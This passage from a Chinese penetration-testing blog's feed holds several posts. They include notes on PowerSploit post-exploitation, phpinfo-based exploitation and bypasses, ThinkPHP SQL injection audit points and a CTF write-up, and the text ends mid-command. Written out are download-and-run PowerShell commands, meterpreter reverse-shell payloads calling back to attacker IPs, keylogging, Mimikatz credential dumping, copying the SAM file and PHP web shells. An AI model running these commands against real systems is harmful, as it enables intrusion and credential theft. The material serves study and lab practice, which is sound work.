    <content type="html"><![CDATA[<h3 id="powersploit"><a href="#powersploit" class="headerlink" title="powersploit"></a>powersploit</h3><p>后渗透工具，一直没用过，正好今天看到拿来记录下。</p><span id="more"></span><p><img src="https://i.imgur.com/WePWAEa.png"></p><p>这个东西是要搭建在vps上，然后渗透的时候直接用powershell远程加载执行ps脚本。</p><h3 id="powershell实例运用"><a href="#powershell实例运用" class="headerlink" title="powershell实例运用"></a>powershell实例运用</h3><h4 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h4><pre><code>IEX (New-Object Net.WebClient).DownloadString(&quot;http://192.168.233.128/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&quot;)Get-Help Invoke-Shellco</code></pre><p><img src="https://i.imgur.com/6t9jA7s.png"></p><h4 id="注入payload反弹马"><a href="#注入payload反弹马" class="headerlink" title="注入payload反弹马"></a>注入payload反弹马</h4><h5 id="powershell-lt-3-0"><a href="#powershell-lt-3-0" class="headerlink" title="powershell &lt; 3.0"></a>powershell &lt; 3.0</h5><pre><code>Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.233.128 -Lport 9999 -Force</code></pre><p>可以直接反弹msfshell 很方便</p><h5 id="指定进程注入反弹马"><a href="#指定进程注入反弹马" class="headerlink" title="指定进程注入反弹马"></a>指定进程注入反弹马</h5><pre><code>Get-Process 获取进程Start-Process c:\windows\system32\notepad.exe  -WindowStyle Hidden //新建隐藏进程注入Invoke-Shellcode -ProcessID 1628 -Payload windows/meterpreter/reverse_https -Lhost 192.168.146.129 -Lport 4444  </code></pre><h5 id="posershell-gt-3-0"><a href="#posershell-gt-3-0" class="headerlink" title="posershell &gt;= 3.0"></a>posershell &gt;= 3.0</h5><p>大于3.0的话和正常流程没啥区别</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.233.128 LPORT=9999 -f powershell -o /var/www/html/testIEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.233.128/CodeExecution/Invoke-Shellcode.ps1&quot;)IEX (New-Object Net.WebClient).DownloadString(&quot;http://192.168.233.128/test&quot;)Invoke-Shellcode -Shellcode ($buf)</code></pre><p><img src="https://i.imgur.com/raatKAM.png"></p><p>没执行成功，个人感觉还不如直接生成ps脚本，powershell调用。</p><h4 id="dll注入"><a href="#dll注入" class="headerlink" title="dll注入"></a>dll注入</h4><p>dll文件要在主机上。</p><p>先下载dll注入脚本<br>    IEX (New-Object Net.WebClient).DownloadString(“<a href="http://192.168.146.129/CodeExecution/Invoke-DllInjection.ps1&quot;%EF%BC%89">http://192.168.146.129/CodeExecution/Invoke-DllInjection.ps1&quot;）</a></p><p>创建隐藏进程</p><pre><code> Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden</code></pre><p>查找进程号</p><pre><code>Get-Process notepad</code></pre><p>注入dll </p><pre><code>Invoke-DllInjection -ProcessID 10900 -Dll .\msf.dll</code></pre><h4 id="Invoke-Portscan端口扫描"><a href="#Invoke-Portscan端口扫描" class="headerlink" title="Invoke-Portscan端口扫描"></a>Invoke-Portscan端口扫描</h4><pre><code>IEX (New-Object Net.WebClient).DownloadString(&quot;http://192.168.233.128/PowerSploit/Recon/Invoke-Portscan.ps1Invoke-Portscan -Hosts 192.168.233.128,127.0.0.1 -Ports &quot;21,22,80,8080,1433,3389&quot;</code></pre><p><img src="https://i.imgur.com/xFunKZb.png"></p><h4 id="Invoke-Mimikatz-查看主机密码（需要管理员权限"><a href="#Invoke-Mimikatz-查看主机密码（需要管理员权限" class="headerlink" title="Invoke-Mimikatz 查看主机密码（需要管理员权限)"></a>Invoke-Mimikatz 查看主机密码（需要管理员权限)</h4><pre><code>IEX (New-Object Net.WebClient).DownloadString(&quot;http://192.168.233.128/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1Invoke-Mimikatz -DumpCre</code></pre><h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h4><pre><code>IEX (New-Object Net.WebClient).DownloadString(&quot;http://192.168.233.128/PowerSploit/Exfiltration/Get-Keystrokes.ps1&quot;)Get-Keystrokes -LogPath .\keylogger.txt</code></pre><h4 id="超级复制（需要管理员权限，可以复制受保护的运行中的系统文件"><a href="#超级复制（需要管理员权限，可以复制受保护的运行中的系统文件" class="headerlink" title="超级复制（需要管理员权限，可以复制受保护的运行中的系统文件)"></a>超级复制（需要管理员权限，可以复制受保护的运行中的系统文件)</h4><pre><code>IEX (New-Object Net.WebClient).DownloadString(&quot;http://192.168.146.129/Exfiltration/Invoke-NinjaCopy.ps1&quot;)Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SAM&quot; -LocalDestination &quot;C:\Users\light\Desktop\SA</code></pre><p>还是有点牛批。</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;powersploit&quot;&gt;&lt;a href=&quot;#powersploit&quot; class=&quot;headerlink&quot; title=&quot;powersploit&quot;&gt;&lt;/a&gt;powersploit&lt;/h3&gt;&lt;p&gt;后渗透工具，一直没用过，正好今天看到拿来记录下。&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://phyb0x.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>phpinfo信息利用</title>
    <link href="https://phyb0x.github.io/2018/12/01/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8/"/>
    <id>https://phyb0x.github.io/2018/12/01/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8/</id>
    <published>2018-12-01T03:03:19.000Z</published>
    <updated>2019-01-19T02:04:36.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>电脑凉了，充不进去电很难受，买了块电池看看怎样，一周没有电脑的日子很难过啊。在实验室刷tools在评论里看到篇文章很不错，拿来复现下。</p><span id="more"></span><p>原文地址</p><p><a href="http://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/">http://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/</a></p><h3 id="phpinfo页面利用"><a href="#phpinfo页面利用" class="headerlink" title="phpinfo页面利用"></a>phpinfo页面利用</h3><h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p><img src="https://i.imgur.com/vM7tmOA.png"></p><p>获取具体版本，可以用来提权</p><h4 id="extension-dir"><a href="#extension-dir" class="headerlink" title="extension_dir"></a>extension_dir</h4><p><img src="https://i.imgur.com/zTd8b7D.png"></p><p>php扩展的路径，图省事没用lamp包有点捞…(这里还是说下linux不推荐用phpstudy，很多linux装了phpstudy系统会崩)</p><h4 id="http-x-real-ip"><a href="#http-x-real-ip" class="headerlink" title="http_x_real_ip"></a>http_x_real_ip</h4><p>直接获取真实ip，无视代理、cdn。本地环境并没有发现这个参数，应该是ini配置问题。顺便说下<code>HTTP_X_FORWARDED_FOR</code>的区别，<code>HTTP_X_FORWARDED_FOR</code>会记录代理过程且可伪造</p><h4 id="web根目录"><a href="#web根目录" class="headerlink" title="web根目录"></a>web根目录</h4><p><img src="https://i.imgur.com/qm8Tl9q.png"></p><p>找不到路径，报错/找phpinfo常规操作了。</p><h4 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h4><p>phpinfo-lfi  getshell 很老的洞了，看到学习下</p><p>像phpinfo页面post数据可以在_FILES[“file1”]中看到上传的临时文件，先构造简单上传页面。</p><p><img src="https://i.imgur.com/e8VD0JJ.png"></p><p>其中PHP引擎对enctype=”multipart/form-data”这种请求的处理过程如下：</p><pre><code>1、请求到达2、创建临时文件，并写入上传文件的内容3、调用相应PHP脚本进行处理，如校验名称、大小等4、删除临时文件</code></pre><p><img src="https://i.imgur.com/wjQozjF.png"></p><p>这里可以看到，临时文件可以成功写入，配合lfi即可getshell，不过临时文件很块就会被删除，利用分块传输竞争时间绕过</p><p><a href="https://www.insomniasec.com/downloads/publications/phpinfolfi.py">https://www.insomniasec.com/downloads/publications/phpinfolfi.py</a></p><p>利用脚本，不过我本地测试失败了</p><p>这里说下这个漏洞感觉还是比较鸡肋(条件有点苛刻)</p><pre><code>1、phpinfo2、开启了文件缓存3、没有gpc等函数限制4、开启lfi，有包含点</code></pre><h4 id="allow-url-include"><a href="#allow-url-include" class="headerlink" title="allow_url_include"></a>allow_url_include</h4><p>文件包含有多重要自不必多说。</p><h4 id="asp-tags"><a href="#asp-tags" class="headerlink" title="asp_tags"></a>asp_tags</h4><p><img src="https://i.imgur.com/kha1ISI.png"></p><p>php标签有四种格式，这个是asp风格的，默认不开启。可以上传.haccess/user.ini 绕过(php7移除)</p><h4 id="disable-functions"><a href="#disable-functions" class="headerlink" title="disable_functions"></a>disable_functions</h4><p>禁用函数列表：</p><pre><code>(dl)execsystempassthrupopenproc_openpcntl_execshell_exec</code></pre><h5 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式:"></a>绕过方式:</h5><p>1、记得Seay代码审计里说过<code>dl()</code>函数(需要enable_dl开启)</p><pre><code>&lt;?php//PHP5调用方法dl(&#39;../../../../../home/apache/htdocs/php5.so&#39;);spiderbiguan(&#39;uname -a&#39;);//调用函数?&gt;</code></pre><p>2、编译php时如果加了-–enable-pcntl选项，就可以使用pcntl_exec()来执行命令。PHP&gt;4.2.0</p><pre><code>&lt;?php pcntl_exec(“/bin/bash”, array(“/tmp/b4dboy.sh”));?&gt;#/tmp/b4dboy.sh#!/bin/bashls -l /</code></pre><p>3、利用ImageMagick漏洞绕过disable_function(应该是要组件与扩展都有具体没测试)</p><p><a href="https://www.waitalone.cn/imagemagic-bypass-disable_function.html">https://www.waitalone.cn/imagemagic-bypass-disable_function.html</a></p><p>4、利用环境变量LD_PRELOAD来绕过</p><p><a href="http://www.vuln.cn/6784">http://www.vuln.cn/6784</a>的确是一种好方法，利用起来也没有那么繁琐。</p><p>5、win系统组件</p><pre><code>&lt;?php$command=$_POST[a];$wsh = new COM(&#39;WScript.shell&#39;); // 生成一个COM对象$exec = $wsh-&gt;exec(&#39;cmd.exe /c &#39;.$command);  //调用对象方法来执行命令$stdout = $exec-&gt;StdOut();$stroutput = $stdout-&gt;ReadAll();echo $stroutput?&gt;</code></pre><h4 id="magic-quotes-gpc"><a href="#magic-quotes-gpc" class="headerlink" title="magic_quotes_gpc"></a>magic_quotes_gpc</h4><p>魔术引号，它是用来实现addslshes()和stripslashes()这两个功能的，对SQL注入进行防御。顺便提一嘴用了<code>addslshes()</code>除非是有编码问题要不然是不存在注入的。</p><p><img src="https://i.imgur.com/L7SIZ0Z.png"></p><h4 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h4><p>将用户可操作的文件限制在某目录下</p><p><img src="https://i.imgur.com/2cTWcP9.png"></p><h5 id="绕过方式："><a href="#绕过方式：" class="headerlink" title="绕过方式："></a>绕过方式：</h5><p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">linux下绕过</a>(大佬博客我这里也复现下)</p><p>1、利用DirectoryIterator + Glob 直接列举目录(linux)</p><pre><code>&lt;?phpprintf(&#39;&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;&#39;, ini_get(&#39;open_basedir&#39;));$file_list = array();// normal files$it = new DirectoryIterator(&quot;glob:///*&quot;);foreach($it as $f) &#123;    $file_list[] = $f-&gt;__toString();&#125;// special files (starting with a dot(.))$it = new DirectoryIterator(&quot;glob:///.*&quot;);foreach($it as $f) &#123;    $file_list[] = $f-&gt;__toString();&#125;sort($file_list);foreach($file_list as $f)&#123;        echo &quot;&#123;$f&#125;&lt;br/&gt;&quot;;&#125;?&gt;</code></pre><p><img src="https://i.imgur.com/Dt0u4Ja.png"></p><p>2、realpath列举目录</p><p>利用realpath对传入路径的回显不同加上通配符进行列举。本地环境linux就没有进行测试。</p><pre><code>&lt;?phpini_set(&#39;open_basedir&#39;, dirname(__FILE__));printf(&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;, ini_get(&#39;open_basedir&#39;));set_error_handler(&#39;isexists&#39;);$dir = &#39;d:/test/&#39;;$file = &#39;&#39;;$chars = &#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;;for ($i=0; $i &lt; strlen($chars); $i++) &#123;     $file = $dir . $chars[$i] . &#39;&lt;&gt;&lt;&#39;;    realpath($file);&#125;function isexists($errno, $errstr)&#123;    $regexp = &#39;/File\((.*)\) is not within/&#39;;    preg_match($regexp, $errstr, $matches);    if (isset($matches[1])) &#123;        printf(&quot;%s &lt;br/&gt;&quot;, $matches[1]);    &#125;&#125;?&gt;</code></pre><p>首先设置open_basedir为当前目录，并枚举d:/test/目录下的所有文件。将错误处理交给isexists函数，在isexists函数中匹配出目录名称，并打印出来。</p><p>3、SplFileInfo::getRealPath列举目录</p><p>不需要考虑open_basedir开不开起。</p><pre><code>&lt;?phpini_set(&#39;open_basedir&#39;, dirname(__FILE__));printf(&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;, ini_get(&#39;open_basedir&#39;));$basedir = &#39;D:/test/&#39;;$arr = array();$chars = &#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;;for ($i=0; $i &lt; strlen($chars); $i++) &#123;     $info = new SplFileInfo($basedir . $chars[$i] . &#39;&lt;&gt;&lt;&#39;);    $re = $info-&gt;getRealPath();    if ($re) &#123;        dump($re);    &#125;&#125;function dump($s)&#123;    echo $s . &#39;&lt;br/&gt;&#39;;    ob_flush();    flush();&#125;?&gt;</code></pre><p>还有GD库imageftbbox/imagefttext列举目录bindtextdomain暴力猜解目录，基本也都是要暴力破解，效率比较低。还有这篇文章<a href="https://www.leavesongs.com/bypass-open-basedir-readfile.html">php5全版本绕过open_basedir读文件脚本</a>给跪了</p><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><h4 id="imagick"><a href="#imagick" class="headerlink" title="imagick"></a>imagick</h4><p><a href="https://www.jianshu.com/p/502e39c122e6">这个的远程执行</a></p><h4 id="libxml"><a href="#libxml" class="headerlink" title="libxml"></a>libxml</h4><p>libxml 2.9以前的版本默认支持并开启了外部实体的引用，服务端解析用户提交的 xml 文件时未对 xml 文件引用的外部实体（含外部普通实体和外部参数实体）做合适的处理，会导致XXE。</p><h4 id="memcache"><a href="#memcache" class="headerlink" title="memcache"></a>memcache</h4><p><a href="http://blog.nsfocus.net/memcache-unauthorized-access-exploit/">Memcache未授权访问漏洞利用及修复</a></p><p><img src="https://i.imgur.com/JoEN21l.png"></p><h4 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h4><p>这个不多说了……</p><h4 id="session"><a href="#session" class="headerlink" title="session"></a>session</h4><h4 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h4><h4 id="GOPHER"><a href="#GOPHER" class="headerlink" title="GOPHER"></a>GOPHER</h4><p><a href="https://blog.chaitin.cn/gopher-attack-surfaces/">利用 Gopher 协议拓展攻击面</a><br>看了下尝试复现没有成功，我的理解是首先要支持gopher协议，然后找到一个能执行curl会话的参数，构造gopher格式的payload以post格式去执行反弹shell。(并没有看懂是怎么利用的)</p><h4 id="fastcgi"><a href="#fastcgi" class="headerlink" title="fastcgi"></a>fastcgi</h4><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#php-fpmfastcgi">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#php-fpmfastcgi</a></p><p>通过fastcgi传入环境变量，设置</p><pre><code>&#39;PHP_VALUE&#39;: &#39;auto_prepend_file =php://input&#39;,&#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include = On&#39;</code></pre><p>将执行的代码放在body中执行任意代码。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>从刚接触安全的时候就知道phpinfo里有很重要的信息，然而就在前几天我还直接提了个信息泄露(还撞了，丢脸),复现完真的学到很多。</p><p>参考链接：</p><p><a href="https://www.freebuf.com/articles/web/79830.html">https://www.freebuf.com/articles/web/79830.html</a></p><p><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0151653.html">http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0151653.html</a></p><p><a href="https://bbs.ichunqiu.com/thread-3234-1-1.html">https://bbs.ichunqiu.com/thread-3234-1-1.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;电脑凉了，充不进去电很难受，买了块电池看看怎样，一周没有电脑的日子很难过啊。在实验室刷tools在评论里看到篇文章很不错，拿来复现下。&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://phyb0x.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>thinkphp审计</title>
    <link href="https://phyb0x.github.io/2018/11/12/thinkphp%E5%AE%A1%E8%AE%A1/"/>
    <id>https://phyb0x.github.io/2018/11/12/thinkphp%E5%AE%A1%E8%AE%A1/</id>
    <published>2018-11-12T01:42:08.000Z</published>
    <updated>2019-01-19T02:05:28.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>自己在这个框架上栽了也不指一次两次了，有句话说的好再一再二不再三遂打算深入学习一下.</p><span id="more"></span><h3 id="thinkphp配置"><a href="#thinkphp配置" class="headerlink" title="thinkphp配置"></a>thinkphp配置</h3><h5 id="MVC认知"><a href="#MVC认知" class="headerlink" title="MVC认知"></a>MVC认知</h5><p>MVC是一种将视图、控制、数据三者分开的一种开发模式:</p><p>M-Model模型   编写model类，负责逻辑业务、数据处理</p><p>V-View视图    编写html文件，负责前台js页面显示</p><p>C-Controller  编写类文件，IndexController.class.php，对web应用进行控制、修改、删除等操作</p><h5 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h5><p>1、配置数据库，可以将Thinkphp目录下的配置信息复制到Home目录下</p><p>2、开启页面Trace：’SHOW_PAGE_TRACE’ =&gt;true,添加到配置文件<br><img src="https://i.imgur.com/u0A5xfi.png"></p><p>出现如上情形说明前期准备已经OK。</p><h5 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h5><p>附上官方手册给的典型控制器类的定义：</p><pre><code>&lt;?phpnamespace Home\Controller;use Think\Controller;class IndexController extends Controller &#123;    public function hello()&#123;        echo &#39;hello,thinkphp!&#39;;    &#125;&#125;</code></pre><p>这里主要说的是A方法，需要跨控制器调用官方提供了快捷调用方法A。</p><pre><code>A(&#39;模块/控制器&#39;)//当控制器层名称不是 Controller 时须这样写A(&#39;模块/控制器&#39;,&#39;控制器层名称&#39;)</code></pre><p>当我们在审计时遇到A方法一定要跟进查看。</p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h5 id="where方法"><a href="#where方法" class="headerlink" title="where方法"></a>where方法</h5><p>where方法的参数支持字符串和数组</p><p>在index控制器调用where方法传入字符串参数查询数据</p><pre><code>    $data = M(&#39;User&#39;)-&gt;where(&#39;id=&#39;.I(&#39;id&#39;))-&gt;find();    dump($data);</code></pre><p><img src="https://i.imgur.com/05wthsu.png"></p><p>可以看到如果没有在I方法中对参数进行过滤或者没有采用预处理、传入数组参数的方式，那么单纯调用where方法传入字符串参数是不安全的，是我们在审计的时候要注意的地方。</p><h4 id="table方法"><a href="#table方法" class="headerlink" title="table方法"></a>table方法</h4><p>通常情况下table方法：</p><p>1、切换操作的数据表；</p><p>2、对多表进行操作；</p><pre><code>testM()-&gt;table(I(&#39;table&#39;))-&gt;where(&#39;1=1&#39;)-&gt;find();</code></pre><p>我们构造语句进行简单测试，结果如下图所示：<br><img src="https://i.imgur.com/WBbv25p.png"><br>可以看到我们传入正确的表名执行的sql语句，只要我们继续构造很容易造成注入。<br><img src="https://i.imgur.com/9Kf13RS.png"></p><h4 id="field方法-union、join、alias类似"><a href="#field方法-union、join、alias类似" class="headerlink" title="field方法 //union、join、alias类似"></a>field方法 //union、join、alias类似</h4><p>field主要是标识要返回或者操作的字段，可以用于查询和写入操作。</p><p>官方文档给出三种查询方式，字符串、数组、数组别名，主要参数可控都是能产生注入的。</p><pre><code>testM(&#39;user&#39;)-&gt;field(array(&#39;id&#39;,&#39;username&#39;=&gt;I(&#39;uname&#39;)))-&gt;select();</code></pre><p><img src="https://i.imgur.com/CbxcAze.png"><br>闭合引号很容易产生注入</p><h4 id="order-group-having"><a href="#order-group-having" class="headerlink" title="order group having"></a>order group having</h4><pre><code>return !empty($order)?  &#39; ORDER BY &#39;.$order:&#39;&#39;;return !empty($group)? &#39; GROUP BY &#39;.$group:&#39;&#39;;return  !empty($having)?   &#39; HAVING &#39;.$having:&#39;&#39;;</code></pre><p>我们可以看到源码中他们都是使用拼接方式直接拼接出来的，如果输入可控都存在注入。</p><pre><code>以order举例M(&#39;User&#39;)-&gt;where(1=1)-&gt;order(array(&#39;id&#39;=&gt;I(&#39;order&#39;)))-&gt;select();</code></pre><p><img src="https://i.imgur.com/HuuGiF9.png"><br>//query、execute、聚合方法也是同样道理</p><h4 id="表达式注入"><a href="#表达式注入" class="headerlink" title="表达式注入"></a>表达式注入</h4><p>exp查询的条件不会被当成字符串，所以后面的查询条件可以使用任何SQL支持的语法，包括使用函数和字段名称。查询表达式不仅可用于查询条件，也可以用于数据更新</p><pre><code> $map = array();    $map[&#39;id&#39;] = $_GET[&#39;id&#39;];    $data = M(&#39;User&#39;)-&gt;where($map)-&gt;find();    dump($data);&#125;</code></pre><p>可以看到上述代码中参数如果没有用I()方法传入的话就会引发注入，$_GET引入可以传入数组类型参数引发exp注入。<br><img src="https://i.imgur.com/mAJqZoe.png"></p><h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>停滞了好久,实在没精力了先这样未完待续……</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;自己在这个框架上栽了也不指一次两次了，有句话说的好再一再二不再三遂打算深入学习一下.&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="https://phyb0x.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>业务安全</title>
    <link href="https://phyb0x.github.io/2018/11/10/%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8(%E5%89%AF%E6%9C%AC)/"/>
    <id>https://phyb0x.github.io/2018/11/10/%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8(%E5%89%AF%E6%9C%AC)/</id>
    <published>2018-11-10T05:27:41.000Z</published>
    <updated>2019-01-19T02:03:32.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>看了业务安全实战指南做的一点笔记，业务逻辑漏洞挖掘还是要细心每个参数功能点都要把握好。</p><span id="more"></span><p><img src="https://i.imgur.com/h1ihbeP.png"></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;看了业务安全实战指南做的一点笔记，业务逻辑漏洞挖掘还是要细心每个参数功能点都要把握好。&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://phyb0x.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>业务安全</title>
    <link href="https://phyb0x.github.io/2018/11/10/%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8/"/>
    <id>https://phyb0x.github.io/2018/11/10/%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8/</id>
    <published>2018-11-10T05:27:41.000Z</published>
    <updated>2019-01-19T02:03:32.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>看了业务安全实战指南做的一点笔记，业务逻辑漏洞挖掘还是要细心每个参数功能点都要把握好。</p><span id="more"></span><p><img src="https://i.imgur.com/h1ihbeP.png"></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;看了业务安全实战指南做的一点笔记，业务逻辑漏洞挖掘还是要细心每个参数功能点都要把握好。&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://phyb0x.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>Smuctfwp</title>
    <link href="https://phyb0x.github.io/2018/11/05/Smuctfwp/"/>
    <id>https://phyb0x.github.io/2018/11/05/Smuctfwp/</id>
    <published>2018-11-05T06:35:27.000Z</published>
    <updated>2019-01-19T02:05:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="100-sql"><a href="#100-sql" class="headerlink" title="100 sql"></a>100 sql</h3><p>简单sql注入</p><span id="more"></span><p>直接sqlmap跑 然后找到admin账号密码登录就行。<br> admin<br> asf451asf2154sa545<br>flag{2c8f358dc6241ea721fbea0361e130a3}</p><p><img src="https://i.imgur.com/AQqmHVf.png"></p><pre><code>python2 sqlmap.py -r 1.txt --technique T -p username -D test -t user -C &quot;username,password&quot; --dump</code></pre><h3 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>phpmyadmin前台爆破-&gt;读取apache配置文件找路径-&gt;写shell-&gt;提权-&gt;-&gt;抓密码-&gt;flag</p><p>弱密码爆破</p><p>phpmyadmin密码<br>root<br>root123456</p><p>默认路径被改，读取apache配置文件找路径</p><pre><code>SELECT load_file( &quot;C:/phpStudy/PHPTutorial/Apache/conf/httpd.conf&quot; )；</code></pre><p><img src="https://i.imgur.com/BDzfJc0.png"></p><p>读取到web根目录写shell/修改日志记录getshell</p><pre><code>SELECT &#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;INTO OUTFILE &#39;C:/phpStudy/PHPTutorial/a6ds523d/shell.php&#39;；</code></pre><p>拿到shell之后发现并没有对目录读写进行多大限制，权限为apache权限，进行提权。</p><p><img src="https://i.imgur.com/L5RWrV4.png"></p><p>生成上传msf木马,可以看到有执行权限，反弹msfshell。</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.19.128 LPORT=444 -f exe -o 444.exe</code></pre><p><img src="https://i.imgur.com/sBBaeHP.png"><br><img src="https://i.imgur.com/13N9K1v.png"></p><p>这么多随便用一个成功率高的就好。权限虽然是apache但是对目录运行读写权限并没有过多限制，随便来。</p><p>我直接用前段时间的2018-8120好用点。<br><img src="https://i.imgur.com/yAnaGCn.png"></p><p>可以看到直接用户是不行的，用8120添加成功并添加管理组。<br>目标机没有开启3389 </p><p><img src="https://i.imgur.com/dCMTmtN.png"></p><p>看到服务是开启的，那么因该是端口被修改了，找pid2244 最后发现是4399端口。</p><p><img src="https://i.imgur.com/KXvLl8o.png"><br>连接成功</p><p>mimikatz抓密码</p><p><img src="https://i.imgur.com/zQmDeuC.png"></p><p>解密 Administratorhash即为flag</p><p>apache Smuwelcome</p><p>fl4g  itsError</p><h3 id="0…day"><a href="#0…day" class="headerlink" title="0…day???"></a>0…day???</h3><p>数据库 </p><p>my<br>123456root</p><p>Smuadmin<br>Smuwahaha123</p><p>这题稍微有点坑</p><p><img src="https://i.imgur.com/jRqq9DX.png"></p><p>可以看到这边扫到了网站的备份</p><p>网站是phpcms的，常规思路也是直接就审计上了。</p><p>然而等着你的就是这个</p><p><img src="https://i.imgur.com/5E3mQAK.png"></p><p><img src="https://i.imgur.com/gwe1wWo.png"></p><p>真正的点就在这了 redis未授权访问 </p><p>ssh写公钥、计划任务弹shell已经被我限制了 直接写webshell</p><p><img src="https://i.imgur.com/x5vl2zm.png"></p><p>普通菜刀直接连接会报错</p><p><img src="https://i.imgur.com/H3nBKlT.png"></p><p>可以看到木马已经传上去了，命令也是能执行的</p><p><img src="https://i.imgur.com/m434Vrg.png"></p><p>但是PHP是高版本，高版本php7.0 过滤一些符号 删除了一些函数<br>我这里是用的java版连接  蚁剑应该也以</p><p><img src="https://i.imgur.com/b99n67e.png"></p><h3 id="垃圾小王吧"><a href="#垃圾小王吧" class="headerlink" title="垃圾小王吧"></a>垃圾小王吧</h3><p>Smuwelcome123</p><p>tomcat弱口令getshell -&gt; ssh流量转发 -</p><p>运维小王把flag落在没搭建好的环境里了，你能帮他找回吗？</p><p><img src="https://i.imgur.com/k2lCdYN.png"></p><p>弱口令 admin 123456</p><pre><code>jar -cvfM0 hello.war ./</code></pre><p>马的内容打包成war上传<br>菜刀连接 root权限</p><p>连上去并没有什么信息，ifconfig下发现有内网网段<br>arp -a 发现ip 10.10.10.133</p><p><img src="https://i.imgur.com/t5Qyk3P.png"></p><p>nmap扫描扫到开放80 3306端口猜测开放web服务。<br>由于是server没有图形化界面，通过添加账号ssh转发流量到本地访问。</p><p>添加超级用户(没回显一句话添加)</p><pre><code>echo 